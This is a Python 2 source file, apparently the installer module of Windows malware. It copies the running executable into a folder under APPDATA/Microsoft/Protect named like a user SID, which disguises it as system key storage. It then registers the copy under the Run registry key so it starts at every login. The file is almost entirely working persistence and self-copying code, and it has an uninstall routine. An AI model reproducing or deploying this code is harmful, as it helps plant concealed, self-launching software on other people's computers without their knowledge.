import os
import sys
import shutil
import _winreg


class fso_installer(object):

    def __init__(self, new_filename):
        # define some global variables regarding filename and filepath.
        self.dropname         = new_filename
        self.current_filename = sys.executable
        self.current_filepath = os.path.abspath(self.current_filename)
        self.current_dirpath  = os.path.dirname(os.path.abspath(self.current_filename))

        self.APPDATA_dirpath  = os.getenv('APPDATA')
        self.target_dirpath   = self.APPDATA_dirpath + r'/Microsoft/Protect/S-1-5-21-3833344108-2106042970-1858380074-1001/'
        self.target_filepath  = self.target_dirpath + self.dropname

        # define some global variables regarding winreg.
        self.key_value        = r'Software\Microsoft\Windows\CurrentVersion\Run'
        self.key_name         = self.dropname.split('.')[0]


    def checkdir_exist(self):
        if not os.path.exists(self.target_filepath):
            os.makedirs(self.target_dirpath)

    def self_copy(self):
        # it will overwrite the file if the file already exists.
        shutil.copy(self.current_filepath, self.target_filepath)

    def set_permission(self):
        os.chmod(self.target_filepath, S_IREAD)

    def add_startup(self):
        try:
            self.targetkey = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, self.key_value, 0, _winreg.KEY_ALL_ACCESS)
            _winreg.SetValueEx(self.targetkey, self.key_name, 0, _winreg.REG_SZ, self.target_filepath)
            print '[DEBUG] Added startup to registry.'
        except Exception as self.e:
            print '[DEBUG] An error occurred while modifying registry.' + str(self.e)
            sys.exit(0)

    def uninstall(self):
        # remove startup from registry.
        try:
            self.targetkey = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, self.key_value, 0, _winreg.KEY_ALL_ACCESS)
            _winreg.DeleteValue(self.targetkey, self.key_name)
            print '[DEBUG] Removed startup from registry.'
        except Exception as self.e:
            print '[DEBUG] An error occurred while modifying registry.' + str(self.e)
            sys.exit(0)

        # delete the main file.
        os.remove(self.target_filepath)

        # kill process.
        sys.exit(0)

    def Start(self):
        # check if the directory already exists.
        #self.checkdir_exist()

        # copy the file to the destination.
        self.self_copy()

        # add to startup.
        self.add_startup()

        # set permission to read-only.
        #self.set_permission()
